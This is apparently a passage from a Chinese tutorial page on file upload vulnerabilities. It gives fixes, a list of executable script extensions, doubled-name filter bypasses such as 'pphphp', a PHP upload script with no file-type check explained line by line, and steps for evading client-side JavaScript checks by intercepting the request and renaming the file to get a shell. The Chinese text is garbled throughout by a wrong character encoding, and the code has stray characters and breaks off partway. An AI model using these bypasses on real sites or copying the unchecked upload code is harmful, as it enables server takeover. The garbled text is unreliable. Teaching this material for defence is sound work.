åé—¨åˆ°ç½‘ç«™ä¸Šã€‚</li><li><strong>ä¸­é—´ä»¶æˆ–ç³»ç»Ÿç‰¹æ€§åˆ©ç”¨</strong>ï¼šé€šè¿‡ä¸­é—´ä»¶æˆ–ç³»ç»Ÿç‰¹æ€§ï¼Œæ”»å‡»è€…å¯ä»¥ä¸Šä¼ å¯è¢«æœåŠ¡å™¨è§£æçš„è„šæœ¬æ–‡ä»¶ï¼Œä»è€Œæ§åˆ¶ç½‘ç«™ã€‚</li></ul><h2 id="æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„ä¿®å¤æ–¹æ¡ˆ"><a href="#æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„ä¿®å¤æ–¹æ¡ˆ" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„ä¿®å¤æ–¹æ¡ˆ"></a>æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„ä¿®å¤æ–¹æ¡ˆ</h2><ul><li><p>åœ¨ç½‘ç«™ä¸­éœ€è¦å­˜åœ¨ä¸Šä¼ æ¨¡å—ï¼Œéœ€è¦åšå¥½æƒé™è®¤è¯ï¼Œä¸èƒ½è®©åŒ¿åç”¨æˆ·å¯è®¿é—®ã€‚</p></li><li><p>æ–‡ä»¶ä¸Šä¼ ç›®å½•è®¾ç½®ä¸ºç¦æ­¢è„šæœ¬æ–‡ä»¶æ‰§è¡Œã€‚è¿™æ ·è®¾ç½®å³ä½¿è¢«ä¸Šä¼ åé—¨çš„åŠ¨æ€è„šæœ¬ä¹Ÿä¸èƒ½è§£æï¼Œå¯¼è‡´æ”»å‡»è€…æ”¾å¼ƒè¿™ä¸ªæ”»å‡»é€”å¾„ã€‚</p></li><li><p>è®¾ç½®ä¸Šä¼ ç™½åå•ï¼Œç™½åå•åªå…è®¸å›¾ç‰‡ä¸Šä¼ å¦‚ï¼Œjpg png gif å…¶ä»–æ–‡ä»¶å‡ä¸å…è®¸ä¸Šä¼ </p></li><li><p>ä¸Šä¼ çš„åç¼€åï¼Œä¸€å®šè¦è®¾ç½®æˆå›¾ç‰‡æ ¼å¼å¦‚ jpg png gif</p></li></ul><h1 id="2-4-æ–‡ä»¶ä¸Šä¼ çš„æ”»å‡»æ–¹æ³•"><a href="#2-4-æ–‡ä»¶ä¸Šä¼ çš„æ”»å‡»æ–¹æ³•" class="headerlink" title="2.4 æ–‡ä»¶ä¸Šä¼ çš„æ”»å‡»æ–¹æ³•"></a>2.4 æ–‡ä»¶ä¸Šä¼ çš„æ”»å‡»æ–¹æ³•</h1><p>å¯»æ‰¾æµ‹è¯•ç½‘ç«™çš„æ–‡ä»¶ä¸Šä¼ çš„æ¨¡å—ï¼Œå¸¸è§ å¤´åƒä¸Šä¼ ï¼Œä¿®æ”¹ä¸Šä¼ ï¼Œæ–‡ä»¶ç¼–è¾‘å™¨ä¸­æ–‡ä»¶ä¸Šä¼ ï¼Œå›¾ç‰‡ä¸Šä¼ ã€åª’ä½“ä¸Šä¼ ç­‰ï¼Œé€šè¿‡æŠ“åŒ…ä¸Šä¼ æ¶æ„çš„æ–‡ä»¶è¿›è¡Œæµ‹è¯•ï¼Œä¸Šä¼ åç¼€å asp php aspx ç­‰çš„åŠ¨æ€è¯­è¨€è„šæœ¬ï¼ŒæŸ¥çœ‹ä¸Šä¼ æ—¶çš„è¿”å›ä¿¡æ¯ï¼Œåˆ¤æ–­æ˜¯å¦èƒ½ç›´æ¥ä¸Šä¼ ï¼Œå¦‚æœä¸èƒ½ç›´æ¥ä¸Šä¼ ï¼Œå†è¿›è¡Œæµ‹è¯•ä¸Šä¼ çªç ´ï¼Œä¾‹å¦‚ä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™åªå…è®¸å›¾ç‰‡æ ¼å¼çš„åç¼€ï¼Œä½†æ˜¯ä¿®æ”¹æ–‡ä»¶æ—¶ï¼Œå´æ²¡æœ‰é™åˆ¶åç¼€åï¼Œå›¾ç‰‡æ–‡ä»¶å¯ä»¥ä¿®æ”¹æˆåŠ¨æ€è¯­è¨€æ ¼å¼å¦‚ phpï¼Œåˆ™å¯èƒ½è®¿é—®è¿™ä¸ªæ–‡ä»¶çš„ URL ç›´æ¥ getshellï¼Œå¯ä»¥æ§åˆ¶ç½‘ç«™</p><h1 id="2-5æ–‡ä»¶ä¸Šä¼ æ¼æ´"><a href="#2-5æ–‡ä»¶ä¸Šä¼ æ¼æ´" class="headerlink" title="2.5æ–‡ä»¶ä¸Šä¼ æ¼æ´"></a>2.5æ–‡ä»¶ä¸Šä¼ æ¼æ´</h1><h2 id="2-5-1-å¸¸è§çš„ç½‘ç«™æ–‡ä»¶åç¼€å"><a href="#2-5-1-å¸¸è§çš„ç½‘ç«™æ–‡ä»¶åç¼€å" class="headerlink" title="2.5.1 å¸¸è§çš„ç½‘ç«™æ–‡ä»¶åç¼€å"></a>2.5.1 å¸¸è§çš„ç½‘ç«™æ–‡ä»¶åç¼€å</h2><p>å¯æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶åç¼€åï¼Œå¯è¢«ç½‘ç«™ç›®å½•è§£æã€‚ä»¥ä¸‹æ˜¯å¸¸è§çš„åç¼€å</p><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line">asp</span><br><span class="line"></span><br><span class="line">asa</span><br><span class="line"></span><br><span class="line">cdx</span><br><span class="line"></span><br><span class="line">cer</span><br><span class="line"></span><br><span class="line">aspx</span><br><span class="line"></span><br><span class="line">ashx</span><br><span class="line"></span><br><span class="line"><span class="keyword">jsp</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line">php</span><br><span class="line"></span><br><span class="line">php3</span><br><span class="line"></span><br><span class="line">php.a</span><br><span class="line"></span><br><span class="line"><span class="keyword">shtml</span></span><br><span class="line"><span class="keyword"></span></span><br><span class="line">phtml</span><br></pre></td></tr></table></figure><p>æœ‰äº›ç½‘ç«™ä¼šå¯¹ asp æˆ–è€… php è¿›è¡Œè¿‡æ»¤è½¬æˆç©ºå¯ç”¨è¿™äº›åç¼€åã€‚</p><p><code>aspasp asaspp</code></p><p><code>pphphp</code></p><h2 id="2-5-2-ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´"><a href="#2-5-2-ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´" class="headerlink" title="2.5.2 ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´"></a>2.5.2 ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´</h2><p>ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´åˆåæ–‡ä»¶ç›´æ¥ä¸Šä¼ æ¼æ´ è¿™ç§æ¼æ´å±å®³æå¤§ï¼Œå¦‚æœæ”»å‡»è€…èƒ½ç›´æ¥ä¸Šä¼ æ¶æ„è„šæœ¬åˆ°ç½‘ç«™å­˜æ”¾çš„ç›®å½•ï¼Œ<strong>ä¸”è¿™ä¸ªç›®å½•å¯è§£æåŠ¨æ€è„šæœ¬è¯­è¨€</strong>ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±èƒ½å¤Ÿç›´æ¥è·å–ç½‘ç«™æƒé™ï¼Œç”šè‡³è¿›ä¸€æ­¥æƒé™æå‡ï¼Œæ§åˆ¶æœåŠ¡å™¨</p><h3 id="ä»£ç åˆ†æ"><a href="#ä»£ç åˆ†æ" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>) &#123;`</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;`</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;`</span><br><span class="line">    <span class="variable">$upload_dir</span> = <span class="string">&quot;uploads/&quot;</span>;`</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);`</span><br><span class="line">    <span class="variable">$target_file</span> = <span class="variable">$upload_dir</span> . <span class="variable">$file_name</span>;`</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$target_file</span>)) &#123;`</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;The file &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$file_name</span>) . <span class="string">&quot; has been uploaded.&quot;</span>;`</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;`</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry, there was an error uploading your file.&quot;</span>;`</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">````</span><br><span class="line"></span><br><span class="line">è¿™æ®µ PHP ä»£ç å®ç°äº†ä¸€ä¸ªç®€å•çš„æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ã€‚å®ƒæ¥æ”¶ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶ï¼Œå¹¶å°è¯•å°†å…¶å­˜å‚¨åˆ°æœåŠ¡å™¨çš„æŒ‡å®šç›®å½•ä¸­ã€‚ä»¥ä¸‹æ˜¯å¯¹ä»£ç çš„é€è¡Œè§£é‡Šï¼š</span><br><span class="line"></span><br><span class="line"><span class="comment">### ä»£ç è§£é‡Š</span></span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br></pre></td></tr></table></figure><ul><li>**<code>&lt;?php</code>**ï¼šPHP è„šæœ¬çš„å¼€å§‹æ ‡è®°ï¼Œè¡¨ç¤ºä»¥ä¸‹å†…å®¹æ˜¯ PHP ä»£ç ã€‚</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>) &#123;</span><br></pre></td></tr></table></figure><ul><li>**<code>$_FILES[&quot;file&quot;][&quot;error&quot;]</code>**ï¼š<code>$_FILES</code> æ˜¯ä¸€ä¸ªè¶…å…¨å±€æ•°ç»„ï¼Œç”¨äºå­˜å‚¨æ–‡ä»¶ä¸Šä¼ çš„ç›¸å…³ä¿¡æ¯ã€‚<code>&quot;file&quot;</code> æ˜¯è¡¨å•ä¸­æ–‡ä»¶è¾“å…¥å­—æ®µçš„åç§°ï¼ˆ<code>&lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;</code>ï¼‰ã€‚<code>&quot;error&quot;</code> æ˜¯ä¸€ä¸ªé”™è¯¯ä»£ç ï¼Œè¡¨ç¤ºæ–‡ä»¶ä¸Šä¼ è¿‡ç¨‹ä¸­æ˜¯å¦å‘ç”Ÿé”™è¯¯ã€‚</li><li>**<code>if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)</code>**ï¼šæ£€æŸ¥æ–‡ä»¶ä¸Šä¼ æ˜¯å¦å‡ºé”™ã€‚å¦‚æœ <code>$_FILES[&quot;file&quot;][&quot;error&quot;]</code> çš„å€¼å¤§äº 0ï¼Œè¡¨ç¤ºä¸Šä¼ è¿‡ç¨‹ä¸­å‘ç”Ÿäº†é”™è¯¯ã€‚</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><ul><li>**<code>echo</code>**ï¼šè¾“å‡ºå­—ç¬¦ä¸²ã€‚</li><li>**<code>$_FILES[&quot;file&quot;][&quot;error&quot;]</code>**ï¼šè¾“å‡ºé”™è¯¯ä»£ç ã€‚</li><li>**<code>&lt;br&gt;</code>**ï¼šHTML æ ‡ç­¾ï¼Œè¡¨ç¤ºæ¢è¡Œã€‚</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br></pre></td></tr></table></figure><ul><li>å¦‚æœæ–‡ä»¶ä¸Šä¼ æ²¡æœ‰é”™è¯¯ï¼Œæ‰§è¡Œä»¥ä¸‹ä»£ç ã€‚</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$upload_dir</span> = <span class="string">&quot;uploads/&quot;</span>;</span><br></pre></td></tr></table></figure><ul><li>**<code>$upload_dir</code>**ï¼šå®šä¹‰æ–‡ä»¶ä¸Šä¼ çš„ç›®æ ‡ç›®å½•ã€‚</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br></pre></td></tr></table></figure><ul><li>**<code>$_FILES[&quot;file&quot;][&quot;name&quot;]</code>**ï¼šç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶åã€‚</li><li>**<code>basename()</code>**ï¼šå‡½æ•°ç”¨äºè·å–æ–‡ä»¶åçš„åŸºåï¼ˆå³å»æ‰è·¯å¾„éƒ¨åˆ†ï¼‰ã€‚ä¾‹å¦‚ï¼Œå¦‚æœç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶åæ˜¯ <code>path/to/file.jpg</code>ï¼Œ<code>basename()</code> ä¼šè¿”å› <code>file.jpg</code>ã€‚</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$target_file</span> = <span class="variable">$upload_dir</span> . <span class="variable">$file_name</span>;</span><br></pre></td></tr></table></figure><ul><li>**<code>$target_file</code>**ï¼šç›®æ ‡æ–‡ä»¶çš„å®Œæ•´è·¯å¾„ï¼Œç”±ä¸Šä¼ ç›®å½•å’Œæ–‡ä»¶åæ‹¼æ¥è€Œæˆã€‚</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$target_file</span>)) &#123;</span><br></pre></td></tr></table></figure><ul><li>**<code>$_FILES[&quot;file&quot;][&quot;tmp_name&quot;]</code>**ï¼šæ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨åå­˜å‚¨çš„ä¸´æ—¶æ–‡ä»¶è·¯å¾„ã€‚</li><li>**<code>move_uploaded_file()</code>**ï¼šå‡½æ•°ç”¨äºå°†ä¸Šä¼ çš„æ–‡ä»¶ä»ä¸´æ—¶ç›®å½•ç§»åŠ¨åˆ°æŒ‡å®šçš„ç›®æ ‡è·¯å¾„ã€‚</li><li>**<code>if (move_uploaded_file(...))</code>**ï¼šæ£€æŸ¥æ–‡ä»¶æ˜¯å¦æˆåŠŸç§»åŠ¨åˆ°ç›®æ ‡è·¯å¾„ã€‚</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;The file &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$file_name</span>) . <span class="string">&quot; has been uploaded.&quot;</span>;</span><br></pre></td></tr></table></figure><ul><li>**<code>htmlspecialchars()</code>**ï¼šå‡½æ•°ç”¨äºå°†ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ï¼Œé˜²æ­¢ XSS æ”»å‡»ã€‚</li><li>è¾“å‡ºæ–‡ä»¶ä¸Šä¼ æˆåŠŸçš„æ¶ˆæ¯ã€‚</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br></pre></td></tr></table></figure><ul><li>å¦‚æœæ–‡ä»¶ç§»åŠ¨å¤±è´¥ï¼Œæ‰§è¡Œä»¥ä¸‹ä»£ç ã€‚</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry, there was an error uploading your file.&quot;</span>;</span><br></pre></td></tr></table></figure><ul><li>è¾“å‡ºæ–‡ä»¶ä¸Šä¼ å¤±è´¥çš„æ¶ˆæ¯ã€‚</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>**<code>?&gt;</code>**ï¼šPHP è„šæœ¬çš„ç»“æŸæ ‡è®°ã€‚</li></ul><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>è¿™æ®µä»£ç å®ç°äº†ä¸€ä¸ªç®€å•çš„æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼š</p><ol><li>æ£€æŸ¥æ–‡ä»¶ä¸Šä¼ æ˜¯å¦å‡ºé”™ã€‚</li><li>å¦‚æœæ²¡æœ‰é”™è¯¯ï¼Œå°†æ–‡ä»¶ä»ä¸´æ—¶ç›®å½•ç§»åŠ¨åˆ°æŒ‡å®šçš„ç›®æ ‡ç›®å½•ã€‚</li><li>è¾“å‡ºæ–‡ä»¶ä¸Šä¼ æˆåŠŸæˆ–å¤±è´¥çš„æ¶ˆæ¯ã€‚</li></ol><h2 id="2-5-3-ç»•è¿‡jså‰ç«¯æ£€æµ‹ä¸Šä¼ "><a href="#2-5-3-ç»•è¿‡jså‰ç«¯æ£€æµ‹ä¸Šä¼ " class="headerlink" title="2.5.3 ç»•è¿‡jså‰ç«¯æ£€æµ‹ä¸Šä¼ "></a>2.5.3 ç»•è¿‡jså‰ç«¯æ£€æµ‹ä¸Šä¼ </h2><h3 id="jsç»•è¿‡æ–¹æ³•"><a href="#jsç»•è¿‡æ–¹æ³•" class="headerlink" title="jsç»•è¿‡æ–¹æ³•"></a>jsç»•è¿‡æ–¹æ³•</h3><p>æŒ‰ F12 ä½¿ç”¨ç½‘é¡µå®¡è®¡å…ƒç´ ï¼ŒæŠŠ<strong>æ ¡éªŒçš„ä¸Šä¼ æ–‡ä»¶åç¼€åæ–‡ä»¶åˆ é™¤ï¼ˆæˆ–åœ¨æµè§ˆå™¨ç¦ç”¨jsï¼‰</strong>ï¼Œå³å¯ä¸Šä¼ ã€‚<br>æŠŠæ¶æ„æ–‡ä»¶æ”¹æˆ js å…è®¸ä¸Šä¼ çš„æ–‡ä»¶åç¼€ï¼Œå¦‚ jpgã€gifã€png ç­‰ï¼Œ<strong>å†é€šè¿‡burpsuiteæŠ“å– post çš„æ•°æ®åŒ…ï¼ŒæŠŠåç¼€åæ”¹æˆå¯æ‰§è¡Œçš„è„šæœ¬åç¼€å¦‚ php ã€aspã€jspã€net ç­‰</strong>ã€‚å³å¯ç»•è¿‡ä¸Šä¼ ã€‚åˆ é™¤ js æ–‡ä»¶</p><p>æŠ“åŒ…ä¿®æ”¹åç¼€å</p><h3 id="jså‰ç«¯æ£€æµ‹åŸç†"><a href="#jså‰ç«¯æ£€æµ‹åŸç†" class="headerlink" title="jså‰ç«¯æ£€æµ‹åŸç†"></a>jså‰ç«¯æ£€æµ‹åŸç†</h3><p>åœ¨æ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œç”¨æˆ·é€‰æ‹©æ–‡ä»¶æ—¶ï¼Œæˆ–è€…æäº¤æ—¶ï¼Œæœ‰äº›<strong>ç½‘ç«™ä¼šå¯¹å‰ç«¯æ–‡ä»¶åè¿›è¡ŒéªŒè¯</strong>ï¼Œä¸€èˆ¬æ£€æµ‹åç¼€åï¼Œæ˜¯å¦ä¸ºä¸Šä¼ çš„æ ¼å¼ã€‚å¦‚æœä¸Šä¼ çš„æ ¼å¼ä¸å¯¹ï¼Œåˆ™å¼¹å‡ºæç¤ºæ–‡å­—ã€‚æ­¤æ—¶<strong>æ•°æ®åŒ…å¹¶æ²¡æœ‰æäº¤åˆ°æœåŠ¡å™¨</strong>ï¼Œåªæ˜¯åœ¨å®¢æˆ·ç«¯é€šè¿‡ js æ–‡ä»¶è¿›è¡Œæ ¡éªŒï¼ŒéªŒè¯ä¸é€šè¿‡åˆ™ä¸ä¼šæäº¤åˆ°æœåŠ¡å™¨è¿›è¡Œå¤„ç†ã€‚</p><h3 id="jså‰ç«¯æ£€æµ‹ä»£ç åˆ†æ"><a href="#jså‰ç«¯æ£€æµ‹ä»£ç åˆ†æ" class="headerlink" title="jså‰ç«¯æ£€æµ‹ä»£ç åˆ†æ"></a>jså‰ç«¯æ£€æµ‹ä»£ç åˆ†æ</h3><p>å®¢æˆ·æ®µ html ä¸Šä¼ æ–‡ä»¶æ—¶ä¼šè°ƒç”¨ <strong>checkFile å‡½æ•°</strong>ï¼Œé¦–å…ˆè·å–æ–‡ä»¶åç¼€åã€‚å¦‚æœæ–‡ä»¶ä¸ºç©ºï¼Œåˆ™å¼¹å‡ºâ€œè¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶â€ï¼Œå¦‚æœæ–‡ä»¶ä¸ä¸ºç©ºï¼Œè·å–ä¸Šä¼ çš„æ–‡ä»¶åç¼€åä¸ .jpgã€.png ã€.gif å…¶ä¸­ä¸€ç§åˆ™æç¤ºâ€œè¯¥æ–‡<br>ä»¶ä¸å…è®¸ä¸Šä¼ â€ï¼Œä¸Šä¼ å¤±è´¥ã€‚</p><figure class="highlight autohotkey"><table><tr><td class="code"><pre><span class="line">`&lt;in put type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;upload_file&quot;</span> id=<span class="string">&quot;fileInput&quot;</span>&gt;`</span><br><span class="line">`&lt;button onclick=<span class="string">&quot;checkFile()&quot;</span>&gt;Check File&lt;/button&gt;`</span><br><span class="line">`&lt;script&gt;`</span><br><span class="line">`function checkFile() &#123;`</span><br><span class="line">    `// è·å–æ–‡ä»¶è¾“å…¥æ¡†çš„å€¼`</span><br><span class="line">    `var file = document.getElementById(&#x27;fileInput&#x27;).value<span class="comment">;`</span></span><br><span class="line">    `if (file == null || file == <span class="string">&quot;&quot;</span>) &#123;`</span><br><span class="line">        `alert(<span class="string">&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&quot;</span>)<span class="comment">;`</span></span><br><span class="line">        `return <span class="literal">false</span><span class="comment">;`</span></span><br><span class="line">    `&#125;`</span><br><span class="line"></span><br><span class="line">    `// å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹`</span><br><span class="line">    `var allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span><span class="comment">;`</span></span><br><span class="line">    `// æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹`</span><br><span class="line">    `var ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>))<span class="comment">;`</span></span><br><span class="line">    `// åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ `</span><br><span class="line">    `if (allow_ext.indexOf(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;`</span><br><span class="line">        `var errMsg = <span class="string">&quot;è¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ &quot;</span> + allow_ext + <span class="string">&quot;ç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š&quot;</span> + ext_name<span class="comment">;`</span></span><br><span class="line">        `alert(errMsg)<span class="comment">;`</span></span><br><span class="line">        `return <span class="literal">false</span><span class="comment">;`</span></span><br><span class="line">    `&#125;`</span><br><span class="line"></span><br><span class="line">    `// å¦‚æœæ–‡ä»¶ç±»å‹éªŒè¯é€šè¿‡ï¼Œè¿”å› <span class="literal">true</span>`</span><br><span class="line">    `return <span class="literal">true</span><span class="comment">;`</span></span><br><span class="line">`&#125;`</span><br><span class="line">`&lt;/script&gt;`</span><br></pre></td></tr></table></figure><hr><p>è¿™æ®µä»£ç æ˜¯ä¸€ä¸ªç®€å•çš„HTMLå’ŒJavaScriptå®ç°çš„æ–‡ä»¶ä¸Šä¼ éªŒè¯åŠŸèƒ½ã€‚å®ƒçš„ä¸»è¦ä½œç”¨æ˜¯æ£€æŸ¥ç”¨æˆ·é€‰æ‹©çš„æ–‡ä»¶æ˜¯å¦ç¬¦åˆå…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹ï¼ˆå¦‚<code>.jpg</code>ã€<code>.png</code>ã€<code>.gif</code>ï¼‰ã€‚ä»¥ä¸‹æ˜¯ä»£ç çš„è¯¦ç»†è§£é‡Šï¼ŒåŒ…æ‹¬HTMLå’ŒJavaScriptéƒ¨åˆ†çš„è¯­æ³•å’Œé€»è¾‘ã€‚</p><h3 id="HTMLéƒ¨åˆ†"><a href="#HTMLéƒ¨åˆ†" class="headerlink" title="HTMLéƒ¨åˆ†"></a>HTMLéƒ¨åˆ†</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;upload_file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;fileInput&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;checkFile()&quot;</span>&gt;</span>Check File<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id=""><a href="#" class="headerlink" title="&lt;input type=&quot;file&quot;&gt;"></a><code>&lt;input type=&quot;file&quot;&gt;</code></h4><ul><li>**<code>&lt;input&gt;</code>**ï¼šHTMLè¡¨å•å…ƒç´ ï¼Œç”¨äºåˆ›å»ºè¾“å…¥å­—æ®µã€‚</li><li>**<code>type=&quot;file&quot;</code>**ï¼šæŒ‡å®šè¾“å…¥å­—æ®µçš„ç±»å‹ä¸ºæ–‡ä»¶é€‰æ‹©å™¨ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡å®ƒé€‰æ‹©æœ¬åœ°æ–‡ä»¶ã€‚</li><li>**<code>name=&quot;upload_file&quot;</code>**ï¼šä¸ºè¾“å…¥å­—æ®µæŒ‡å®šä¸€ä¸ªåç§°ï¼Œç”¨äºåœ¨è¡¨å•æäº¤æ—¶æ ‡è¯†è¯¥å­—æ®µã€‚</li><li>**<code>id=&quot;fileInput&quot;</code>**ï¼šä¸ºè¾“å…¥å­—æ®µæŒ‡å®šä¸€ä¸ªå”¯ä¸€çš„IDï¼Œæ–¹ä¾¿é€šè¿‡JavaScriptè·å–è¯¥å…ƒç´ ã€‚</li></ul><h4 id="-1"><a href="#-1" class="headerlink" title="&lt;button onclick=&quot;checkFile()&quot;&gt;"></a><code>&lt;button onclick=&quot;checkFile()&quot;&gt;</code></h4><ul><li>**<code>&lt;button&gt;</code>**ï¼šHTMLæŒ‰é’®å…ƒç´ ï¼Œç”¨äºåˆ›å»ºä¸€ä¸ªæŒ‰é’®ã€‚</li><li>**<code>onclick=&quot;checkFile()&quot;</code>**ï¼šä¸ºæŒ‰é’®æ·»åŠ ä¸€ä¸ªç‚¹å‡»äº‹ä»¶å¤„ç†å™¨ã€‚å½“ç”¨æˆ·ç‚¹å‡»æŒ‰é’®æ—¶ï¼Œä¼šè°ƒç”¨<code>checkFile()</code>å‡½æ•°ã€‚</li></ul><h3 id="JavaScriptéƒ¨åˆ†"><a href="#JavaScriptéƒ¨åˆ†" class="headerlink" title="JavaScriptéƒ¨åˆ†"></a>JavaScriptéƒ¨åˆ†</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// è·å–æ–‡ä»¶è¾“å…¥æ¡†çš„å€¼</span></span><br><span class="line">    <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;fileInput&#x27;</span>).<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®šä¹‰å…è®¸ä¸Šä¼ çš„æ–‡ä»¶ç±»å‹</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">// æå–ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">// åˆ¤æ–­ä¸Šä¼ æ–‡ä»¶ç±»å‹æ˜¯å¦å…è®¸ä¸Šä¼ </span></span><br><span class="line">    <span class="keyword">if</span> 